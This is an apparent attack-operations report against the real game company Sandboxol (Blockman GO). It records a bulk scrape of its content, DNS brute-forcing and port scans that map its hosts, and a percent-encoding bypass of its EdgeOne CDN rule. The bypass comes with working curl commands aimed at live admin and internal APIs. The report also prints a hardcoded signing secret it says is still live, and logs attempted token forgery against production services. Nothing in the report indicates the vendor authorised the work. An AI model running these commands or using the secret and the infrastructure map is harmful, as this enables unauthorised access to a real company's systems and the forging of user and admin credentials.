# Blockman GO / Sandboxol — Round 4: content download, infra map, and the EdgeOne bypass explained

Date: 2026-10-19

---

## 1. Downloaded content

`C:\Users\quefep\Desktop\Decomp Temp\games\`

| Metric | Value |
|---|---|
| Game folders | **75** (of 77 live configs — 2 have no retrievable artifacts) |
| Engine versions on disk | **2,370** |
| Files | **11,391** (8,053 downloaded zips + 3,338 manifests) |
| Total size | **21.80 GB** |
| Failures | 165 — **all** on the dead `region.download.blockmanmobile.com` vhost (see §4) |
| Index | `games/INDEX.md` · `games/MANIFEST.csv` |

Layout per game:
```
g1008/
  game-resource-config.json    raw live manifest for the game
  v10068/ v10069/ … v10113/
    version.json               fileSize / fileCount / pluginHash / staging flags
    config-files.json          every individual asset URL + md5 for that version
    plugin.zip                 the game plugin (lua server + client code, configs)
    maps/m1008_2.zip           map pack(s)
    maps-staging/m1008_2.zip   pre-release map pack where published
```

**Content scan result (all 8,053 zips, 406k text members):** the live game content contains **no personal identifiers** — 20 "emails" were 2 vendored-library addresses (`phil@freehackers.org`, `jcw@equi4.com`) + 18 regex artefacts; 9 "phone numbers" were **MD5 fragments inside lua source** (e.g. `a15222419219e6e3d6b9997c3dbb08f4f`); 1 Discord link (`discord.gg/f4HsV3QH3C`); 0 Telegram; 0 staff names. All identifiers live in the config/infra layer, not the content.

---

## 2. What "EdgeOne block bypass confirmed exploitable" actually means

### The setup
```
Internet → Tencent EdgeOne (CDN/WAF, 43.174.196.101)  →  their API gateway (Go, etcd-backed)  →  internal microservices
```
EdgeOne carries a **path rule** that blocks two prefixes and returns its own branded 404:
`/admin-api/` and `/inner-api/`. The origin has **no such rule** — the gateway routes any of the 13 prefixes in its table.

### Why the bypass works
The CDN rule matches on the **raw request path string**. Percent-encoding a character that the CDN does not decode breaks the match, while the origin decodes it and routes normally:

| Request | CDN rule matches? | Who answers | Body signature |
|---|---|---|---|
| `/admin-api/` | **yes** | EdgeOne | 1064 B branded HTML 404 |
| `/Admin-Api/`, `/ADMIN-API/` | no (rule is case-sensitive) | gateway | 19 B `404 page not found` |
| `//admin-api/` | no (no slash normalisation) | gateway | 19 B `404 page not found` |
| `/admin-api%2f` | no (`%2f` ≠ `/`) | **admin-api service** | `{"code":400004,…,"msg":"EC_NOT_FOUND"}` |
| `/%61dmin-api/` | no (`%61` = `a`) | **admin-api service** | `{"code":400004,…}` |
| `/admin-api%2f…/v1/…` | no | **inner/admin service** | `{"code":400006,"msg":"EC_PERMISSION_DENIED"}` |

Control: `/totally-not-a-service-xyz/foo` → 19 B Go 404, i.e. the 18/19 B plain 404 is the **gateway**, while the JSON envelope is a **sandboxol microservice**. That difference is how "the request got past the CDN and reached the service" is proven rather than assumed.

### What it is and is not
- **It is:** the CDN path rule is the *only* layer hiding `admin-api` and `inner-api`. With one character changed, both services are reachable from the internet and answer with their real routing semantics.
- **It also is:** a **route-existence oracle**. `EC_PERMISSION_DENIED` = the route exists and the app wants credentials; `EC_NOT_FOUND` = no such route. So the internal API surface of a service the CDN explicitly hides can be enumerated:
  - `/inner-api%2fdiscord%2fapi%2fv1%2fbind%2fstatus` → `EC_PERMISSION_DENIED` (exists)
  - `/inner-api%2fpay%2fi%2fapi%2fv1%2fwealth%2fusers%2f1` → `EC_PERMISSION_DENIED` (exists)
  - `/file-api%2fuser%2fapi%2fv1%2ffile` → `EC_UNAUTHENTICATED "empty uid"` (exists)
  - `/user-api%2fv1%2fcaptcha_id` → **200, live captcha**
- **It is NOT** an auth bypass on its own. The application layer still demanded credentials (`EC_PERMISSION_DENIED`), and no protected data was retrieved. The severity of the bypass equals whatever the app-layer auth is worth — which is exactly why the leaked master secret (§3) matters: if the app-layer auth is forgeable, the CDN block was the only thing between the internet and those services.

### PoC
```bash
# blocked
curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" https://editorgs.sandboxol.com/admin-api/            # 404 1064
# through
curl -sk --path-as-is https://editorgs.sandboxol.com/admin-api%2f                                          # {"code":400004,…"EC_NOT_FOUND"}
curl -sk --path-as-is https://editorgs.sandboxol.com/inner-api%2fdiscord%2fapi%2fv1%2fbind%2fstatus          # {"code":400006,…"EC_PERMISSION_DENIED"}
```

---

## 3. The master secret, and why it matters more than the bypass

From their own public source:
- `dev/client/Shells/Android/Blockmango/app/jni/Blockman.cpp` → client token = `SHA1(WEB_HTTP_SECRET + userId + gameTimeStamp)`, `WEB_HTTP_SECRET = "pq0194mxoqfh48L362G6R09T737E273X"`
- `dev/atproxy/doc/gamecenter/script/update.py` → request signature = `SHA1(secret + nonce + timestamp)`

Verified offline: `SHA1("pq0194mxoqfh48L362G6R09T737E273X" + "154719" + "1499049522339") = 88df1aad4acf445c1a396caf15fd8c0a24ad5725` — the exact `signature` hardcoded in the public APK's publish tool. **One secret, three uses**: mobile client token, gamecenter/data-service requests, and the admin publish API.

Forgery was attempted against the live services with **synthetic uids only** (`0`, `999999999999999999`) and produced responses identical to a wrong token — the v2 services do not consume the v1 `x-shahe-uid` scheme, so forgery was **not** demonstrated. The formula remains a live risk wherever v1-era endpoints or the publish API are reachable.

---

## 4. Legacy content: what is gone and what is downloadable

Artifact hosts used by the live manifests:

| Host | Files | Status |
|---|---|---|
| `staticgs.sandboxol.com` | 7,877 | live (current content) |
| `static.sandboxol.com` | 174 | live (configs + a few artifacts) |
| `txstaticgs.sandboxol.com` | 2 | live |
| `region.download.blockmanmobile.com` | 165 | **DEAD vhost** |

`region.download.blockmanmobile.com` → 172.237.146.18/.39/.46 (same IPs as `pc.blockmanmobile.com`, which serves 200/openresty fine). The `region.download` vhost itself returns an **empty reply on every request** (HTTP and HTTPS, all three IPs, with the correct Host header) — a retired vhost with no backend. Result: **24 game/version pairs are permanently unretrievable** (22 versions are *only* on that host — games `g1003` and `g1012` in full; plus 2 partial versions elsewhere), while their metadata still lists the URLs. Everything else (2,346 versions) downloaded cleanly.

So: the live content is fully downloadable, and the *oldest* slice of the archive is gone — the manifest advertises artifacts the CDN no longer serves.

---

## 5. New infrastructure discovered this round

DNS brute-force (1095 candidate names across 5 zones) + port scan of 37 IPs × 40 ports, plus CT/DNS-history:

| Host | IP(s) | Services | Note |
|---|---|---|---|
| `jenkins.sandboxol.cn` | 14.21.59.35 | **none open** | internal CI hostname still published in DNS, host firewalled |
| `editor.sandboxol.com` | 159.138.80.62 | 80, 443 | **Huawei Cloud OBS, bucket deleted** (`NoSuchBucket`, `BucketName: editor.sandboxol.com`) — orphaned endpoint |
| `mail.sandboxol.com` / `mail.blockmango.com` | 43.154.252.250/.31, 43.155.124.18 | 80, 443 | corporate webmail (403 at /) |
| `smtp.sandboxol.com` | 101.32.113.90, 124.156.190.79 | 25, 110, 143, 465, 587, 993, 995 | **Tencent QQMail** (`smtp.qq.com`) — POP3/IMAP/SMTP-submission exposed; POP3 and IMAP banners respond, AUTH LOGIN/PLAIN advertised |
| `res.sandboxol.com` | 121.228.170.107/.80 | 80, 443 | ICP-blocked page (`Server: ADM/2.1.1`) |
| `upload.sandboxol.com` | 148.153.109.155/.156 | none open | legacy upload host, DNS only |
| `api.sandboxol.cn` | 47.106.176.91 | 80, 443 | serves 方块堡垒 SPA |
| `gw.sandboxol.com` / `gw.sandboxol.cn` / `gw.sandboxgear.cn` | 43.174.196.101 | 80, 443 | gateway aliases |
| `docs.blockmango.com` | 43.174.196.101 | 80, 443 | live |
| `static.sandboxol.cn` | **6 IPs** incl. 220.167.6.161 | 80/443/8080/8081/8443 (+**22 SSH** on .161) | one origin among CDN nodes |
| `staticgs.sandboxol.com` | 6 IPs | 80, 443 | current game CDN |
| `reg.sandboxol.com` | 54.158.55.210 (AWS) | none open | registration service, no public ports |
| `pc.blockmanmobile.com` | 172.237.146.18/.39/.46 | 80, 443 (openresty) | hosts the dead `region.download` vhost |

**Notes**
- The EdgeOne edge (43.174.196.101) accepts 3000/3001/6379/8899/9000/10080/10443 at TCP level but returns no protocol data — generic edge listeners, **not** a Redis. The Redis lead in the archived repo is a false positive on this edge.
- `smtp.sandboxol.com` runs on **QQMail**, i.e. `sandboxol.com` mail is Tencent-hosted; the same POP3/IMAP endpoints are reachable from the internet. No anonymous or credentialed login was attempted.
- AXFR on all zones (`vip3/4.alidns.com`, `dns11/12/27/28.hichina.com`) → **refused**; no zone transfer.
- The `wuzhanghai` hunt: 116 candidate CDN paths × 5 hosts found exactly **one** name-bearing object — `sandbox/config/server/` (the XLSX with `wuzhanghai` ×9 + `1`, `2`). No other index objects exist; all other folders return 0-byte placeholders or 404.

---

## 6. Status summary

| Asset | Status |
|---|---|
| Game content (75 games, 2,370 versions, 21.8 GB) | **downloaded** |
| Legacy artifacts on `region.download.blockmanmobile.com` | **dead — 24 game/version pairs unrecoverable** |
| `wuzhanghai` XLSX | located, saved, 9 entries + ids |
| All repo credentials (Discord bot, OAuth secret, Firebase, DB, Redis) | **dead / rotated** |
| Publish API (static signature) | not reachable from the internet; origin silent |
| `admin-api` / `inner-api` | **reachable via `%2f` / case / `//`** — route oracle confirmed, auth still enforced |
| Master secret `pq0194mxoqfh48L362G6R09T737E273X` | public, still the signing key for 3 subsystems |
| Personal identifiers inside game content | none |
